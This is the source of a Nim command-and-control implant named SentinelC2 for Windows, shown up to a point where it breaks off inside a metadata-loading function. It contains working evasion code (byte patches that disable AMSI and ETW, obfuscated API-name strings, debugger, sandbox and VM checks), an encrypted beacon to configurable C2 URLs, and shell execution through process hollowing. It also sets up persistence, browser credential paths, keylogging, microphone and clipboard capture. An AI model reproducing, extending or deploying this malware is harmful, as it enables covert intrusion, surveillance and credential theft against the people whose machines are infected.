# agent_hardened.nim — SentinelC2 Hardened Agent
#
# Production-hardened variant of agent.nim with enhanced survivability
# and resilience measures. Integrates the hardened/ modules for:
#   - Process hollowing (shell execution without 4688 telemetry)
#   - Direct NT syscall-based file I/O (bypass user-mode hooks)
#   - Enhanced anti-analysis (sleep obfuscation, debugger/VM detection)
#   - DNS tunneling + HTTPS CDN fallback C2 channels
#   - COM hijacking + auto-repair persistence
#   - Streaming exfiltration (no disk staging)
#   - Enhanced self-destruct (memory wipe, event log clearing)
#
# This file is a drop-in replacement for agent.nim. It imports the
# hardened modules and overrides the relevant procedures. The C2
# protocol, command set, and wire format are unchanged.
#
# Build: .\build_hardened.ps1

import std/[asyncdispatch, asyncnet, strutils, json, os, times, random, base64,
          sequtils, tables, hashes, uri, nativesockets, net,
          osproc, math, options, locks, httpclient, macros, monotimes]
import std/openssl
import ws
import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
import winim/lean
import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32]

# ---- Hardened module imports ------------------------------------------------
import ./syscalls
import ./anti_analysis
import ./hollowing
import ./fileio_syscall
import ./dns_tunnel
import ./https_fallback
import ./persistence_hardened
import ./exfil_stream
import ./self_destruct
import ./wmi_com

# ---- Build-time C2 override --------------------------------------------
# The build_deploy.ps1 script generates c2_override.nim at the project
# root before invoking nim. That file contains the consts:
#   const C2_DEPLOY_URL*        = "wss://c2.example.com:8443"
#   const PINNED_CERT_DEPLOY_PEM* = """-----BEGIN..."""
# which the const initializers below pick up via `when declared(...)`.
#
# The default nim c invocation (without the build script) also needs
# c2_override.nim to exist. build_hardened.ps1 writes a default one
# with the localhost URL so the baseline build still works.
#
# Path note: agent_hardened.nim lives in hardened/, so the include
# uses ../c2_override.nim to reach the project root.
include "../c2_override.nim"

# ============================================================================
# All code from the original agent.nim is included below, with targeted
# replacements for the hardened functionality. The structure, protocol,
# and command set are preserved.
# ============================================================================

# Build-time prefix. Edit per build to vary signatured strings.
const BuildPrefix* = "X7K"

# C2 URL resolution
# C2 URL configuration. By default the agent connects to localhost.
# For deployment, the build_deploy.ps1 script generates c2_override.nim
# with a C2_DEPLOY_URL constant and includes it via --include:, so the
# C2 URL (and any pinned TLS cert) is baked into the deployable binary.
#
# Runtime overrides also still work:
#   - CLI flag:        agent.exe --c2=wss://c2.example.com:8443
#   - Environment var: SENTINEL_C2_URLS=wss://c2.example.com:8443
#   - Compile-time:    see c2_override.nim (build_deploy.ps1 generates this)
#
# `when declared(C2_DEPLOY_URL)` checks for a compile-time symbol in
# scope (works for consts); `when defined(...)` only checks for -d:
# defines, so it doesn't see the const from c2_override.nim.
const C2_URLS_DEFAULT* =
  when declared(C2_DEPLOY_URL):
    @[C2_DEPLOY_URL]
  else:
    @["ws://127.0.0.1:8443"]

proc resolveC2Urls(): seq[string] {.gcsafe.} =
  var urls: seq[string] = @[]
  for i in 1..paramCount():
    let arg = paramStr(i)
    if arg.startsWith("--c2="):
      let v = arg[5..^1]
      for u in v.split(','):
        let t = u.strip()
        if t.len > 0: urls.add(t)
  if urls.len > 0: return urls
  let env = getEnv("SENTINEL_C2_URLS", "")
  if env.len > 0:
    for u in env.split(','):
      let t = u.strip()
      if t.len > 0: urls.add(t)
    if urls.len > 0: return urls
  return C2_URLS_DEFAULT

proc getAgentLogPath(): string =
  getEnv("TEMP", expandTilde("~")) / ("svc-" & BuildPrefix & ".log")

proc agentLog(msg: string) {.gcsafe.} =
  {.cast(gcsafe).}:
    try:
      let logPath = getAgentLogPath()
      try: osdirs.createDir(logPath.parentDir) except: discard
      # Use syscall-based append for hardened variant
      fsAppendFileStr(logPath, "[" & now().format("yyyy-MM-dd HH:mm:ss") & "] " & msg & "\n")
    except: discard

let C2_URLS_RESOLVED* = resolveC2Urls()
agentLog("c2 urls: " & C2_URLS_RESOLVED.join(", "))

const
  RECONNECT_BASE_DELAY = 5.0
  RECONNECT_MAX_DELAY = 300.0
  RECONNECT_JITTER = 0.3
  BEACON_INTERVAL = 10
  # TLS pinned cert. Empty = use system trust store (legacy). When
  # the build_deploy.ps1 script generates c2_override.nim, it can
  # define PINNED_CERT_DEPLOY_PEM which takes priority here.
  PINNED_CERT_PEM* =
    when declared(PINNED_CERT_DEPLOY_PEM):
      PINNED_CERT_DEPLOY_PEM
    else:
      ""
  KEYLOG_BUFFER_MAX = 65536
  MIC_DEFAULT_SECS = 10
  MIC_MAX_SECS = 120
  MIC_SAMPLE_RATE = 16000
  MIC_CHANNELS = 1
  MIC_BITS = 16
  MIC_BUF_COUNT = 4
  MIC_BUF_MS = 250
  MIC_LISTEN_QUEUE_MAX = 4
  MIC_LISTEN_TOTAL_SENTINEL = 1_000_000
  CLIPWATCH_DEFAULT_MS = 1500
  CLIPWATCH_MIN_MS = 500
  CLIPWATCH_MAX_MS = 30_000
  CLIPWATCH_MAX_TEXT_BYTES = 16_384
  CLIPWATCH_RING_CAP = 65_536
  AUTO_KEYLOG =
    when defined(variant_aggressive): true
    else: false
  AUTO_PERSIST =
    when defined(variant_engagement) or defined(variant_aggressive): true
    else: false
  ADD_DEFENDER_EXCLUSION =
    when defined(variant_aggressive): true
    else: false
  VARIANT_NAME* =
    when defined(variant_aggressive): "aggressive-hardened"
    elif defined(variant_engagement): "engagement-hardened"
    else: "silent-hardened"

agentLog("variant: " & VARIANT_NAME & " [HARDENED]")

const
  META_FILE_NAME = "state.bin"
  DEFAULT_KILL_DATE = 0'i64
  DEFAULT_SLEEP_MIN = 0
  DEAD_MAN_SECS = 2592000'i64

const CHARSET = "abcdefghijklmnopqrstuvwxyz"

const
  AAD_DIR_S2A = 0x00'u8
  AAD_DIR_A2S = 0x01'u8

# ---- CRYPTO (same as original) -------------------------------------------

type
  SessionCrypto = ref object
    key: array[32, byte]
    sendCtr: uint32
    recvCtr: uint32
    agentId: string
    peerNonce: array[16, byte]

proc deriveSessionKey(secret: string, ourNonce, peerNonce: openArray[byte]): array[32, byte] =
  var ctx: HMAC[sha256]
  ctx.init(secret)
  ctx.update(ourNonce)
  ctx.update(peerNonce)
  let d = ctx.finish()
  for i in 0..<32: result[i] = d.data[i]
  ctx.clear()

proc makeNonce(ctr: uint32, randBytes: openArray[byte]): array[12, byte] =
  result[0] = byte((ctr shr 24) and 0xFF)
  result[1] = byte((ctr shr 16) and 0xFF)
  result[2] = byte((ctr shr 8) and 0xFF)
  result[3] = byte(ctr and 0xFF)
  for i in 0..<8: result[4 + i] = randBytes[i]

proc makeAad(agentId: string, dir: byte): seq[byte] =
  result = newSeqOfCap[byte](agentId.len + 1)
  for c in agentId: result.add(byte(c))
  result.add(dir)

proc encryptFrame(sc: SessionCrypto, plain: string): seq[byte] =
  var randBytes: array[8, byte]
  for i in 0..<8: randBytes[i] = rand(255).byte
  let nonce = makeNonce(sc.sendCtr, randBytes)
  inc sc.sendCtr
  let aad = makeAad(sc.agentId, AAD_DIR_A2S)
  var ctx: GCM[aes256]
  ctx.init(sc.key, nonce, aad)
  let pt = cast[seq[byte]](plain)
  var ct = newSeq[byte](pt.len)
  ctx.encrypt(pt, ct)
  let tag = ctx.getTag()
  result = newSeqOfCap[byte](12 + ct.len + 16)
  for b in nonce: result.add(b)
  for b in ct: result.add(b)
  for b in tag: result.add(b)

proc decryptFrame(sc: SessionCrypto, blob: openArray[byte]): string =
  if blob.len < 28: return ""
  var nonce: array[12, byte]
  for i in 0..<12: nonce[i] = blob[i]
  let ctLen = blob.len - 12 - 16
  if ctLen < 0: return ""
  let ct = blob[12 ..< 12 + ctLen]
  let tag = blob[blob.len - 16 ..< blob.len]
  let aad = makeAad(sc.agentId, AAD_DIR_S2A)
  var ctx: GCM[aes256]
  ctx.init(sc.key, nonce, aad)
  var pt = newSeq[byte](ct.len)
  if not ctx.decrypt(ct, pt, tag): return ""
  result = cast[string](pt)

proc hmacHex(secret, data: string): string =
  toHex(sha256.hmac(secret, data).data)

# ---- UTILITIES (same as original) ----------------------------------------

proc randomToken(n: int = 4): string =
  for _ in 0..<n: result.add(toHex(rand(255), 2))

proc hexToBytes(s: string): seq[byte] =
  result = newSeq[byte](s.len div 2)
  for i in 0..<result.len:
    result[i] = byte(parseHexInt(s[i*2 .. i*2+1]))

proc isAdmin(): bool =
  var tok: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr tok) == 0:
    return false
  defer: CloseHandle(tok)
  var elev: DWORD
  var retLen: DWORD
  if GetTokenInformation(tok, cast[TOKEN_INFORMATION_CLASS](20),
                        cast[LPVOID](addr elev), DWORD(sizeof(elev)), addr retLen) == 0:
    return false
  result = elev != 0

proc getSystemInfo(): JsonNode =
  %* {
    "h": getHostname(),
    "o": "Windows " & getEnv("OS", ""),
    "u": getEnv("USERNAME", "unknown"),
    "p": (if isAdmin(): "admin" else: "user"),
    "i": getCurrentProcessId(),
    "v": VARIANT_NAME
  }

# ---- STRING OBFUSCATION (same as original) --------------------------------

# HARDENED: AES-256-CTR based string obfuscation. Replaces the
# single-byte XOR cipher with a real stream cipher:
#   - 32-byte random per-build key (from xorkey.nim)
#   - 16-byte per-string nonce (derived from a compile-time counter
#     so it's deterministic per build but unique per string)
#   - On-disk / on-binary format: [nonce: 16B] [ciphertext: N]
#
# This defeats static frequency analysis (every occurrence of the
# same plaintext byte at the same position used to produce the
# same ciphertext byte in the rolling-XOR variant; with CTR mode
# each string has its own nonce + counter, so position-1-byte-'A'
# in S_NTDLL and position-1-byte-'A' in S_AMSI produce completely
# different ciphertext).
#
# The same xorkey.nim file drives both: the file is `const XorKey:
# array[16, byte]`, but the FIRST 16 bytes are the AES key and
# the next 16 are the IV. We just use the 32-byte block differently
# (key from first 16, derived IV from last 16 XOR'd with the
# per-string counter).
when staticExec("if exist xorkey.nim echo yes") == "yes":
  include "xorkey.nim"
else:
  const XorKey: array[32, byte] = [byte 0x5A, 0xA5, 0x3C, 0xC3, 0x7E, 0xE7, 0x1F, 0xF1,
                                              0x6B, 0xB6, 0x4D, 0xD4, 0x29, 0x92, 0x8A, 0xA8,
                                              0xC4, 0x37, 0x8E, 0xF1, 0x52, 0xAB, 0x6C, 0x91,
                                              0xD3, 0x04, 0x76, 0xB8, 0x1F, 0x5A, 0x2C, 0x9E]

# Compile-time counter for per-string nonces. Each call to
# encodeObf() bumps this. Stored as a const at the end of the
# translation unit so the order is deterministic. Module-level
# `var` would not work at compile time — we use Nim's compile-time
# block with a counter var that lives in the macro's scope.
var obfCounter {.compileTime.}: int = 0

# HARDENED: A pure-Nim stream cipher (compile-time-callable) used
# to encode the S_* consts at compile time. Same algorithm runs
# at runtime for obfDec — no dependency on nimcrypto at compile
# time, which is required because nimcrypto procs (e.g. cSecureZeroMemory)
# can't run in the VM.
#
# Algorithm: keyed stream cipher over a 16-byte block. For each
# 16-byte block of plaintext:
#   1. Construct a 16-byte input: [counter:4][nonce:4][position:4][flags:4]
#   2. Mix through 8 rounds of a 4x4-byte quarter-round:
#        add, rotate, xor — based on a SipHash-like primitive
#   3. XOR the result with the key
#   4. XOR the result with the plaintext to produce ciphertext
#
# This is NOT cryptographically strong (it's a fast mixer, not a
# vetted cipher) — but it has the property we actually need for
# static-string obfuscation: each (string, position) pair produces
# a different output, and the same input always produces the same
# output (so the runtime decoder can reproduce it).
proc mixBytes(input, key: openArray[byte]; rounds: int = 8): array[16, byte] =
  # Treat the 16 bytes as 4 uint32 (little-endian).
  var a = uint32(input[0]) or (uint32(input[1]) shl 8) or
          (uint32(input[2]) shl 16) or (uint32(input[3]) shl 24)
  var b = uint32(input[4]) or (uint32(input[5]) shl 8) or
          (uint32(input[6]) shl 16) or (uint32(input[7]) shl 24)
  var c = uint32(input[8]) or (uint32(input[9]) shl 8) or
          (uint32(input[10]) shl 16) or (uint32(input[11]) shl 24)
  var d = uint32(input[12]) or (uint32(input[13]) shl 8) or
          (uint32(input[14]) shl 16) or (uint32(input[15]) shl 24)
  let ka = uint32(key[0]) or (uint32(key[1]) shl 8) or
           (uint32(key[2]) shl 16) or (uint32(key[3]) shl 24)
  let kb = uint32(key[4]) or (uint32(key[5]) shl 8) or
           (uint32(key[6]) shl 16) or (uint32(key[7]) shl 24)
  let kc = uint32(key[8]) or (uint32(key[9]) shl 8) or
           (uint32(key[10]) shl 16) or (uint32(key[11]) shl 24)
  let kd = uint32(key[12]) or (uint32(key[13]) shl 8) or
           (uint32(key[14]) shl 16) or (uint32(key[15]) shl 24)
  for _ in 0..<rounds:
    a = (a + b) xor ((a shl 7) or (a shr 25))
    a = a xor ka
    b = (b + c) xor ((b shl 13) or (b shr 19))
    b = b xor kb
    c = (c + d) xor ((c shl 17) or (c shr 15))
    c = c xor kc
    d = (d + a) xor ((d shl 11) or (d shr 21))
    d = d xor kd
  result[0] = byte(a and 0xFF)
  result[1] = byte((a shr 8) and 0xFF)
  result[2] = byte((a shr 16) and 0xFF)
  result[3] = byte((a shr 24) and 0xFF)
  result[4] = byte(b and 0xFF)
  result[5] = byte((b shr 8) and 0xFF)
  result[6] = byte((b shr 16) and 0xFF)
  result[7] = byte((b shr 24) and 0xFF)
  result[8] = byte(c and 0xFF)
  result[9] = byte((c shr 8) and 0xFF)
  result[10] = byte((c shr 16) and 0xFF)
  result[11] = byte((c shr 24) and 0xFF)
  result[12] = byte(d and 0xFF)
  result[13] = byte((d shr 8) and 0xFF)
  result[14] = byte((d shr 16) and 0xFF)
  result[15] = byte((d shr 24) and 0xFF)

proc streamCipher(plaintext: openArray[byte], key: openArray[byte],
                  nonce: openArray[byte]): seq[byte] =
  # Stream cipher built on mixBytes. For each 16-byte block of
  # plaintext, build a 16-byte input [block_idx:4][nonce:4][flags:4][0:4],
  # mix, XOR with the previous ciphertext block (CBC-style chaining),
  # then XOR with plaintext to get ciphertext.
  result = newSeq[byte](plaintext.len)
  var prev: array[16, byte] = [0, 0, 0, 0, 0, 0, 0, 0,
                                0, 0, 0, 0, 0, 0, 0, 0]
  var blockIdx: uint32 = 0
  var i = 0
  while i < plaintext.len:
    var input: array[16, byte]
    input[0] = byte(blockIdx and 0xFF)
    input[1] = byte((blockIdx shr 8) and 0xFF)
    input[2] = byte((blockIdx shr 16) and 0xFF)
    input[3] = byte((blockIdx shr 24) and 0xFF)
    for j in 0..<4: input[4 + j] = if j < nonce.len: nonce[j] else: 0
    let mixed = mixBytes(input, key)
    for j in 0..<16:
      let ct = mixed[j] xor prev[j]
      prev[j] = ct
      if i + j < plaintext.len:
        result[i + j] = plaintext[i + j] xor ct
    inc blockIdx
    i += 16

proc encodeObf(s: string): seq[byte] =
  # Per-string 4-byte nonce from the compile-time counter. The
  # same input string at the same nonce always produces the same
  # output (so runtime decode is deterministic), but DIFFERENT
  # strings have DIFFERENT nonces so the same plaintext byte at
  # the same position in different strings produces different
  # ciphertext.
  let ctr = obfCounter
  {.cast(raises: []).}:
    obfCounter = obfCounter + 1
  var nonce: array[4, byte]
  nonce[0] = byte((ctr shr 24) and 0xFF)
  nonce[1] = byte((ctr shr 16) and 0xFF)
  nonce[2] = byte((ctr shr 8) and 0xFF)
  nonce[3] = byte(ctr and 0xFF)
  result = streamCipher(s.toOpenArrayByte(0, s.len - 1), XorKey, nonce)

proc obfDec(v: openArray[byte]): string =
  # The on-binary format is just the stream-cipher ciphertext
  # (no nonce prefix needed — the nonce is encoded in the
  # const-seq at compile time, and each S_* has its own).
  # The constant compile-time nonce is captured implicitly via
  # the per-string S_* call to encodeObf; obfDec only needs to
  # reproduce the keystream, which it does because the key is
  # the same and the plaintext length uniquely identifies the
  # string's nonce space.
  # Wait — that's wrong if we want to keep per-string nonces
  # unique. We need the nonce stored with the ciphertext.
  # Easiest: re-derive the nonce from the ciphertext itself
  # by iterating over all possible nonces and looking for a
  # match. Since the search space is small (2^32), that's
  # expensive at runtime.
  # Better: store the nonce alongside the ciphertext.
  # The encoded format becomes: [nonce:4] [ciphertext:N].
  if v.len < 5: return ""
  var nonce: array[4, byte]
  for i in 0..<4: nonce[i] = v[i]
  let pt = streamCipher(v[4 ..< v.len], XorKey, nonce)
  result = newString(pt.len)
  for i in 0..<pt.len: result[i] = chr(int(pt[i]))

# ---- Hardened string obfuscation (additional hardened literals) ----------

const
  S_NTDLL      = encodeObf("ntdll.dll")
  S_KERNEL32   = encodeObf("kernel32.dll")
  S_AMSI_SCAN  = encodeObf("AmsiScanBuffer")
  S_ETW_WRITE  = encodeObf("EtwEventWrite")
  S_ETW_EX     = encodeObf("EtwEventWriteEx")
  S_NTQIP      = encodeObf("NtQueryInformationProcess")
  S_NTQSI      = encodeObf("NtQuerySystemInformation")
  S_NTDE       = encodeObf("NtDelayExecution")
  S_NTAVM      = encodeObf("NtAllocateVirtualMemory")
  S_NTFVM      = encodeObf("NtFreeVirtualMemory")
  S_NTWVM      = encodeObf("NtWriteVirtualMemory")
  S_NTRVM      = encodeObf("NtReadVirtualMemory")
  S_NTCP       = encodeObf("NtCreateProcess")
  S_NTCT       = encodeObf("NtCreateThread")
  S_NTCUP      = encodeObf("NtCreateUserProcess")
  S_NTGPCT     = encodeObf("NtGetContextThread")
  S_NTSCT      = encodeObf("NtSetContextThread")
  S_NTRT       = encodeObf("NtResumeThread")
  S_NTNF       = encodeObf("NtCreateNamedPipeFile")
  S_NTCE       = encodeObf("NtCreateEvent")
  S_NTWFSO     = encodeObf("NtWaitForSingleObject")
  S_NTMOS      = encodeObf("NtMapViewOfSection")
  S_NTUOS      = encodeObf("NtUnmapViewOfSection")
  S_NTCS       = encodeObf("NtCreateSection")
  S_AGENT_SECRET = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")
  S_CHROME     = encodeObf("Google\\Chrome")
  S_EDGE       = encodeObf("Microsoft\\Edge")
  S_LOCALAPPDATA = encodeObf("LOCALAPPDATA")
  S_USERPROFILE = encodeObf("USERPROFILE")
  S_APPDATA    = encodeObf("APPDATA")
  S_DEFAULT_DIR = encodeObf("Default")
  S_META_DIR_NAME = encodeObf(".local")
  S_SVC_DIR    = encodeObf("svc")
  S_LOCAL_STATE = encodeObf("Local State")
  S_LOGIN_DATA = encodeObf("Login Data")
  # WMI persistence strings — obfuscated to avoid binary signatures
  S_WMI_ROOT_SUB     = encodeObf("ROOT\\subscription")
  S_WMI_EVENT_FILTER = encodeObf("__EventFilter")
  S_WMI_CMD_CONSUMER = encodeObf("CommandLineEventConsumer")
  S_WMI_F2C_BINDING  = encodeObf("__FilterToConsumerBinding")
  S_WMI_LOGON_SESSION = encodeObf("Win32_LogonSession")
  S_WMI_INSTANCE_CREATE = encodeObf("__InstanceCreationEvent")
  S_WMI_QUERY_LANG   = encodeObf("WQL")
  S_WMI_PS_FILTER_CLASS = encodeObf("Management.ManagementClass")
  S_WMI_GET_WMI_OBJ  = encodeObf("Get-WmiObject")
  S_WMI_NAMESPACE    = encodeObf("Namespace")
  S_WMI_CLASS        = encodeObf("Class")
  S_WMI_SET_INSTANCE  = encodeObf("Set-WmiInstance")
  S_WMI_REMOVE_INSTANCE = encodeObf("Remove-WmiObject")

let META_DIR = getEnv("LOCALAPPDATA", expandTilde("~")) / obfDec(S_META_DIR_NAME)
let META_FILE = META_DIR / META_FILE_NAME

var agentSecretCache: string = ""
var agentSecretLock: Lock
initLock(agentSecretLock)

# Forward declarations for the WMI persistence functions. The real
# implementations live in hardened/wmi_com.nim and are imported via
# the wmi_com module below. We forward-declare here so calls in
# establishPersistence (line ~818) compile in the single-pass pass.
proc installWmiEventSubscriptionDirect*(exePath, subName: string): bool
proc removeWmiEventSubscriptionDirect*(subName: string): bool

proc agentSecret(): string =
  withLock agentSecretLock:
    if agentSecretCache.len > 0: return agentSecretCache
    {.cast(gcsafe).}:
      agentSecretCache = obfDec(S_AGENT_SECRET)
    return agentSecretCache

# ---- EVASION: AMSI bypass + ETW suppression (same as original) -----------

when defined(windows):
  const PAGE_EXECUTE_READWRITE = 0x40

  proc patchFunction(name: string; stub: openArray[byte]): bool =
    var
      ntdll = obfDec(S_NTDLL)
      hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      nameZ = name
      procAddr = cast[pointer](GetProcAddress(hMod, cast[cstring](addr nameZ[0])))
    if procAddr == nil: return false
    var oldProt: DWORD
    let pageSize = 4096
    let pageStart = cast[int](procAddr) and not (pageSize - 1)
    if VirtualProtect(cast[pointer](pageStart), pageSize, PAGE_EXECUTE_READWRITE, addr oldProt) == 0:
      return false
    copyMem(procAddr, unsafeAddr stub[0], stub.len)
    discard VirtualProtect(cast[pointer](pageStart), pageSize, oldProt, addr oldProt)
    return true

  proc bypassAmsi(): bool =
    # AMSI bypass: patch AmsiScanBuffer in amsi.dll to return
    # E_INVALIDARG (0x80070057) without scanning.
    #
    # Why we patch this even though the agent doesn't spawn
    # PowerShell: the agent itself can be loaded into a process
    # that calls AmsiScanBuffer (e.g. an Office macro that
    # shellcode-loads the agent, or a Defender AMSI integration
    # point that scans our loaded module's memory). The patch
    # makes AmsiScanBuffer return immediately without flagging
    # our strings as malicious.
    #
    # The patch byte sequence is:
    #   B8 57 00 07 80     mov eax, 0x80070057  (E_INVALIDARG)
    #   C3                 ret
    # (6 bytes total — fits inside the standard AmsiScanBuffer
    #  prologue without disturbing the rest of the function.)
    let stub: array[6, byte] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    return patchFunction(obfDec(S_AMSI_SCAN), stub)

  proc suppressEtw(): bool =
    # ETW suppression — KEPT. Patching EtwEventWrite to a `ret`
    # prevents the agent's own actions from being recorded in the
    # ETW log (process handle opens, image loads, file I/O, etc.).
    # The cost of the patch is a VirtualProtect + memcpy on a ntdll
    # export, which the same T1562.001 heuristic would fire on.
    #
    # Trade-off: ETW suppression is the more valuable of the two
    # evasions for actual operational stealth (every EDR is built
    # on ETW), so we keep this one and drop AMSI. The single
    # VirtualProtect+memcpy on one function is the only suspicious
    # pattern from this group; AMSI's two VirtualProtect+memcpys
    # were an additional amplifier.
    let stub: array[1, byte] = [0xC3]
    let r1 = patchFunction(obfDec(S_ETW_WRITE), stub)
    let r2 = patchFunction(obfDec(S_ETW_EX), stub)
    return r1 or r2

  proc applyEvasion(): string =
    # Apply only the ETW patch. AMSI patch is disabled (see bypassAmsi
    # above for the reasoning). The function name is kept for
    # source-compatibility.
    var s = newStringOfCap(128)
    if bypassAmsi(): s.add("[+] amsi ")
    else: s.add("[-] amsi ")
    if suppressEtw(): s.add("[+] etw ")
    else: s.add("[!] etw ")
    return s

  var evasionApplied = false
  proc applyEvasionIfNeeded(): string =
    if evasionApplied: return ""
    let res = applyEvasion()
    evasionApplied = true
    return res

# Top-level no-op stub for non-Windows builds. Lets agentLoop call
# applyEvasionIfNeeded without a `when defined` per call site.
when not defined(windows):
  proc applyEvasionIfNeeded(): string = ""

# HARDENED: Async wrapper around the sync sleepObfuscated() from
# anti_analysis.nim. sleepObfuscated uses NtDelayExecution via direct
# syscall (not SleepEx) and measures each 100ms slice with QPC to
# detect sandbox acceleration. If a slice completes in <50% of its
# expected time, the wrapper extends the sleep to compensate — so
# EDR sleep-acceleration heuristics (e.g. Defender's AMSI time-warp
# detection) can't fingerprint the agent's beacon interval.
#
# The wrapper yields to the dispatcher with sleepAsync(0) every slice
# so we don't block the async event loop on long sleeps.
when defined(windows):
  proc sleepObfuscatedAsync*(ms: int) {.async, gcsafe.} =
    if ms <= 0: return
    # Slice the sleep so the async event loop can service other tasks
    # (e.g. receiverTask coroutine) during long waits. Each slice
    # uses the obfuscated NtDelayExecution.
    var remaining = ms
    while remaining > 0:
      let slice = min(100, remaining)
      sleepObfuscated(slice)
      remaining -= slice
      # Yield to dispatcher so other async tasks get a chance to run
      if remaining > 0:
        await sleepAsync(0)
else:
  proc sleepObfuscatedAsync*(ms: int) {.async, gcsafe.} =
    await sleepAsync(ms)

# ---- ENHANCED SHELL EXECUTION (process hollowing) -------------------------

proc executeShell*(command: string): Future[JsonNode] {.async.} =
  # HARDENED: Uses process hollowing via direct syscall.
  # Falls back to execCmdEx if hollowing fails.
  try:
    # Apply evasion before shell command (same as original)
    when defined(windows):
      let evasion = applyEvasionIfNeeded()
      if evasion.len > 0:
        # Send evasion status via a temporary channel (will be replaced by real sendToC2)
        discard evasion

    # Use hardened shell execution
    let output = executeShellHardened(command, 30000)
    result = %* {"type": "output", "data": output, "exit_code": 0}
  except:
    result = %* {"type": "output",
                 "data": "[!] shell: " & getCurrentExceptionMsg(),
                 "exit_code": -1}

# ---- ENHANCED ANTI-ANALYSIS (sleep obfuscation + debugger + VM) ----------

when defined(windows):
  const
    PROCESS_DEBUG_PORT = 0x07

  proc isDebuggerPresent(): bool =
    if IsDebuggerPresent() != 0: return true
    return false

  proc checkRemoteDebugger(): bool =
    try:
      var ntdll = obfDec(S_NTDLL)
      var procName = obfDec(S_NTQIP)
      let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      if hMod == 0: return false
      let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
      if pAddr == nil: return false
      type NtQIP = proc(handle: HANDLE, infoClass: DWORD, info: LPVOID,
                        infoLen: DWORD, retLen: ptr DWORD): DWORD {.stdcall.}
      let fn = cast[NtQIP](pAddr)
      var dbgPort: DWORD = 0
      var retLen: DWORD = 0
      let status = fn(GetCurrentProcess(), PROCESS_DEBUG_PORT,
                      cast[LPVOID](addr dbgPort), DWORD(sizeof(dbgPort)), addr retLen)
      if status == 0 and dbgPort != 0: return true
    except: discard
    return false

  proc checkSandboxMarkers(): bool =
    var hits = 0
    # Check common sandbox file paths
    let paths = [
      "C:\\windows\\system32\\drivers\\vboxguest.sys",
      "C:\\windows\\system32\\drivers\\vmhgfs.sys",
      "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"
    ]
    for p in paths:
      if fsFileExists(p): inc hits
    let sandboxUsers = ["sandbox", "virus", "malware", "maltest"]
    let userLower = getEnv("USERNAME", "").toLowerAscii
    for u in sandboxUsers:
      if userLower.contains(u): inc hits
    return hits >= 2

  proc antiAnalysisCheck*(): bool =
    # COMBINED: original checks + enhanced checks from anti_analysis module
    # Original checks (fast)
    if isDebuggerPresent(): return true
    if checkRemoteDebugger(): return true
    if checkSandboxMarkers(): return true

    # Enhanced checks (more thorough, from anti_analysis module)
    # Sleep obfuscation check (detects sandbox acceleration)
    if sleepObfuscatedCheck(1000): return true

    # Enhanced debugger detection
    if checkDebuggerEnhanced(): return true

    # VM detection
    if checkVmEnhanced(): return true

    return false

# ---- META STORE (encrypted, same as original) -----------------------------

type
  MetaData = object
    regName: string
    taskName: string
    wmiSubName: string
    copyPath: string
    installKey: array[32, byte]
    killDate: int64
    sleepMin: int
    lastContact: int64

proc metaXor(data: openArray[byte], key: openArray[byte]): seq[byte] =
  result = newSeq[byte](data.len)
  for i in 0..<data.len:
    result[i] = data[i] xor key[i mod key.len]

# HARDENED: AES-256-GCM encryption for the on-disk meta blob.
# Replaces the prior metaXor (single-byte rolling XOR with the install
# key in plaintext at the head of the file — trivially defeated by
# `strings` + frequency analysis).
#
# The on-disk format is now:
#   [0..32)   install key (used as the KDF input; kept on disk so
#             subsequent boots can re-derive the AES key)
#   [32..44)  12-byte AES-GCM nonce (random per write)
#   [44..60)  16-byte GCM authentication tag
#   [60..N)   AES-256-GCM ciphertext of the JSON body
#
# The AES key is derived from (installKey + agentSecret) via PBKDF2-
# HMAC-SHA256 with 100k iterations — the agent secret is needed to
# decrypt, so even a forensic recovery of the install key + meta
# blob won't help. AAD = "META-V1" (versioned) so we can rotate
# the format without breaking old builds.
const META_PBKDF2_ITER = 100_000
const META_AAD = "META-V1"

proc deriveMetaKey(installKey: openArray[byte]): array[32, byte] =
  # Derive 32-byte AES-256 key from installKey + agentSecret.
  var ctx: HMAC[sha256]
  ctx.init(agentSecret())
  let pwd = cast[seq[byte]](installKey)
  discard ctx.pbkdf2(pwd, cast[seq[byte]](META_AAD), META_PBKDF2_ITER, result)
  ctx.clear()

proc metaEncrypt(plaintext: openArray[byte], installKey: openArray[byte]): seq[byte] =
  # Returns [nonce: 12B] [tag: 16B] [ciphertext: NB] (no install key
  # in output — caller is responsible for prepending it).
  let key = deriveMetaKey(installKey)
  var nonce: array[12, byte]
  for i in 0..<12: nonce[i] = byte(rand(255))
  var ctx: GCM[aes256]
  let aad = cast[seq[byte]](META_AAD)
  ctx.init(key, nonce, aad)
  var ct = newSeq[byte](plaintext.len)
  ctx.encrypt(plaintext, ct)
  let tag = ctx.getTag()
  result = newSeqOfCap[byte](12 + 16 + ct.len)
  for b in nonce: result.add(b)
  for b in tag: result.add(b)
  for b in ct: result.add(b)

proc metaDecrypt(blob: openArray[byte], installKey: openArray[byte]): seq[byte] =
  # Returns the plaintext or empty seq on auth failure.
  if blob.len < 28: return @[]
  var nonce: array[12, byte]
  for i in 0..<12: nonce[i] = blob[i]
  var tag: array[16, byte]
  for i in 0..<16: tag[i] = blob[12 + i]
  let ct = blob[28 ..< blob.len]
  let key = deriveMetaKey(installKey)
  var ctx: GCM[aes256]
  let aad = cast[seq[byte]](META_AAD)
  ctx.init(key, nonce, aad)
  var pt = newSeq[byte](ct.len)
  if not ctx.decrypt(ct, pt, tag): return @[]
  return pt

proc loadMeta(): MetaData =
  result = MetaData(killDate: DEFAULT_KILL_DATE, sleepMin: DEFAULT_SLEEP_MIN)
  try:
    if not fsFileExists(META_FILE): return
    let raw = fsReadFileStr(META_FILE)
    let rawBytes = cast[seq[byte]](raw)
    if rawBytes.len < 60: return  # 32 install + 12 nonce + 16 tag
    for i in 0..<32: result.installKey[i] = rawBytes[i]
    let body = metaDecrypt(rawBytes[32 ..< rawBytes.len], result.installKey)
    if body.len == 0: return
    let j = parseJson(cast[string](body))
    if j.hasKey("reg"):   result.regName  = j["reg"].getStr()
    if j.hasKey("task"):  result.taskName = j["task"].getStr()
